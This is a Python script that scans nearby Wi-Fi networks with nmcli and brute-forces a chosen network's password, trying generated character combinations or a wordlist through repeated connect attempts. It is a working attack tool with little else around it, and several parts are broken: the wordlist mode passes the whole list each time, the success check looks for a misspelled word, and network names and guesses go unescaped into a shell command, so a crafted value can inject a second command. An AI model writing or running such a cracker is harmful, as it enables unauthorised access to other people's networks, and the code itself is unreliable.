import subprocess
import os
import itertools


def make(chars, leng):
    i = itertools.product(chars, repeat=leng)
    return i

def conect(iface, pas, ssid):
    command = 'nmcli d wifi connect "'+ssid+'" password '+pas+' ifname '+iface
    res = subprocess.run(command, shell=True, capture_output=True, text=True)
    suc_chk = res.stdout
    if "successfull" in suc_chk:
        return True
    else:
        return False

def proc_wifi(op_wifi, wifi):
    wifi = op_wifi
    wifi = wifi.split("  ")
    wifi = str(wifi)

    remove_char = ["'',"," ","'","[","]"]
    for x in remove_char:
        wifi = wifi.replace(x,"")

    wifi = wifi.split(",")

    mac = wifi[0]
    ssid = wifi[1]
    ch = wifi[3]
    rate = wifi[4]

    return mac, ssid, ch, rate

def get_wifi(iface):
    command = "nmcli dev wifi"
    res = subprocess.run(command, shell=True, capture_output=True, text=True)
    wifi = res.stdout
    wifi = wifi.split("\n")
    return wifi

def main(iface):
    wifi = get_wifi(iface)
    for i in range(len(wifi)):
        w = wifi[i]
        if i != 0:
            if "*" not in w:
                print(str(i)+") "+w)
            elif "*" in w:
                w = w.replace("*"," ")
                wifi[i] = w
                print(str(i)+") "+w)
            else:
                pass
        else:
            pass

    valid = False
    while not valid:
        try:
            op = int(input("enter wifi number: "))
            wi = wifi[op]
            valid = True
        except Exception:
            print("[!] make sure input is int and is in detected wifi list")

    mac, ssid, ch, rate = proc_wifi(wi, wifi)
    print("\n\n")
    print("[MAC] "+ mac)
    print("[SSID] "+ssid)
    print("[CHANNEL] "+ch)
    print("[RATE] "+rate)
    print("\n")
    
    valid = False
    while not valid:
        chk = input("do you know the wifi password [Y/N] ")
        chk = chk.lower()
        if chk == "y":
            valid = True
            val = False
            while not val:
                try:
                    pas = input("enter password for "+ssid+": ")
                    chk = conect(iface,pas,ssid)
                    if chk:
                        print("succsess!")
                        val = True
                    else:
                        print("[!] wrong password, press CTRL+C to stop the connecting to wifi")
                except KeyboardInterrupt:
                    print("[!] stopping connection proccses...")
                    val = True
       
        elif chk == "n":
            print("1) py-brute (uses itertools)")
            print("2) worldist")
            i = input("enter option: ")
            if i == "1":
                char_set = input("enter charset to use (eg: 123 or ejaf024): ")
                leng = int(input("enter the max len of the char string: "))
                for i in range(8,leng):
                    product = make(char_set, i)
                    for word in product:
                        pas = str(word)
                        pas = str(pas)
                        pas = pas.replace("')","")
                        pas = pas.replace("('","")
                        pas = pas.replace("'","")
                        pas = pas.replace(" ","")
                        pas = pas.replace(",","")
                        word = pas
                        print("trying password: "+word)
                        chk = conect(iface, word, ssid)
                        if chk:
                            print("succses!")
                            print("password: "+word)
                            break
                        else:
                            print("[!] wrong password, press CTRL+C to stop the connecting to wifi")
            elif i == "2":
                valid = True
                chk = False
                while not chk:
                    try:
                        pas_word = input("enter path to wordlist to try: ")
                        pas = open(pas_word,"r").readlines()
                        chk = True
                    except FileNotFoundError:
                        print("[!] file not found")
                
                for i in pas:
                    try:
                        chk = conect(iface,pas,ssid)
                        if chk:
                            print("succsess!")
                            break
                        else:
                            print("[!] wrong password, press CTRL+C to stop the connecting to wifi")
                    except KeyboardInterrupt:
                        print("[!] stopping connection proccses...") 
                        break
             
        else:
            pass